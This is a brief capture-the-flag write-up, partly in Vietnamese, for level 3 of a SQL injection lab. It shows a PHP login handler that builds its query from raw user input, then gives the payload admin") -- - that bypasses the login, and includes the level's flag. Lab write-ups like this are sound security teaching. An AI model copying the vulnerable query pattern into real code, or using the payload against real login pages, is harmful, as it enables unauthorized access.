# **Level 3:**

```php
<?php
function loginHandler($username, $password)
{
	try {
		include("db.php");
		$database = make_connection("hashed_db");

		$sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
		$query = $database->query($sql);
		$row = $query->fetch_assoc(); // Get the first row

		if ($row === NULL)
			return "Wrong username or password"; // No result

		$login_user = $row["username"];
		if ($login_user === "admin")
			return "Wow you can log in as admin, here is your flag flag{4f629fe490901e261258d977a47f96e1}, but how about <a href='level4.php'>THIS LEVEL</a>!";
		else
			return "You log in as $login_user, but then what? You are not an admin";
	} catch (mysqli_sql_exception $e) {
		return $e->getMessage();
	}
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
	$username = $_POST["username"];
	$password = $_POST["password"];
	$message = loginHandler($username, $password);
}

include("static/html/login.html");
```
Ở Level 3 này tương tự Lv2 , Nhưng nó chỉ sử dụng thêm dấu ngoặc tròn để đóng giá trị lại 
```php
username=LOWER(\"$username\")
```

Vậy payload cần là: 
```sql
admin") -- -
```

<img width="1492" height="819" alt="image" src="https://github.com/user-attachments/assets/cf047556-d281-4d30-92b9-16e3e76c4a2d" />

Done Level 3 nhe !!!
